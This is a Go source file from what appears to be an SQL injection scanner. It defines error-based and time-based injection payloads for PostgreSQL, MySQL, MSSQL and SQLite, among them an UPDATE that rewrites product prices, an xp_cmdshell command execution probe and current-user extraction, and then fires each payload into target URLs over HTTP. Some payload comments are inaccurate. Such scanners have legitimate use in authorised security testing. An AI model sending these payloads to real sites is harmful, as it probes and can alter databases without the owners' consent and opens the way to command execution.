package injections

import (
	"GoInjection/backend/helper"
	"GoInjection/backend/query"
	"GoInjection/backend/structs"
	"fmt"
	"strings"
)

var errorPayloads = map[string][]string{
	"PostgresSQL": {
		"1/0",                 // Division by zero
		"CAST('a' AS INT)",    // Invalid cast
		"to_number('a', '9')", // Invalid number conversion
		"SELECT * FROM pg_catalog.pg_tables WHERE table_name = 'non_existent_table';", // Privilege violation (accessing protected system table)
		"UPDATE products SET price = CAST('abc' AS INT);",                             // Invalid cast in an update
		"SELECT pg_sleep(5);", // Trigger a delay in query response (time-based blind injection)
	},
	"MySQL": {
		"1/0",                 // Division by zero
		"CAST('a' AS SIGNED)", // Invalid cast
		"SELECT * FROM information_schema.tables WHERE table_name = 'non_existent_table';", // Privilege violation (accessing protected system table)
		"UPDATE products SET price = CAST('abc' AS SIGNED);",                               // Invalid cast in an update
		"SELECT SLEEP(5);",             // Trigger a delay in query response (time-based blind injection)
		"SELECT CONCAT(0x0A, user());", // Extract current user information using SQL injection
	},
	"MsSQL": {
		"1/0",              // Division by zero
		"CAST('a' AS INT)", // Invalid cast
		"SELECT * FROM sys.objects WHERE name = 'non_existent_table';", // Privilege violation (accessing protected system object)
		"UPDATE products SET price = CONVERT(int, 'abc');",             // Invalid conversion in update
		"SELECT WAITFOR DELAY '00:00:05';",                             // Trigger a delay in query response (time-based blind injection)
		"EXEC xp_cmdshell 'echo test';",                                // Execute system command (xp_cmdshell)
	},
	"SQLite": {
		"1/0",                            // Division by zero
		"CAST('a' AS INT)",               // Invalid cast
		"SELECT json_extract('a', '$');", // Invalid JSON access
		"SELECT hex(123);",               // Trigger error using invalid operation on data
		"SELECT load_extension('/path/to/nonexistent/library');", // Load a non-existent library
		"SELECT CURRENT_USER;", // Extract current user information
	},
}

func ErrorInjection(url string) (bool, string) {
	cleanedURLs, err := helper.GetUrls(url)
	helper.LogError(err)

	q := query.Query{DBMS: structs.TargetSyntax}
	for _, cleanedURL := range cleanedURLs {
		if payloads, ok := errorPayloads[structs.TargetSyntax]; ok {
			for _, payload := range payloads {
				payloads, status := q.Build(payload)
				if status != "Success" {
					return false, fmt.Sprintf("Error generating payloads: %s", status)
				}

				for _, payload = range payloads {
					response, statusCode := helper.SendRequest(strings.ReplaceAll(cleanedURL, helper.PayloadReplaceString, helper.URLEncodeQuery(payload)))
					structs.ErrorLinks++
					
					if statusCode >= 500 || strings.Contains(strings.ToLower(response), "sql syntax") || strings.Contains(strings.ToLower(response), "sql error") || strings.Contains(strings.ToLower(response), "database error") || strings.Contains(strings.ToLower(response), "exception") {
						structs.TargetError = true
						return true, payload
					}
				}
			}
		}
	}

	return false, "No Error-based injection detected."
}
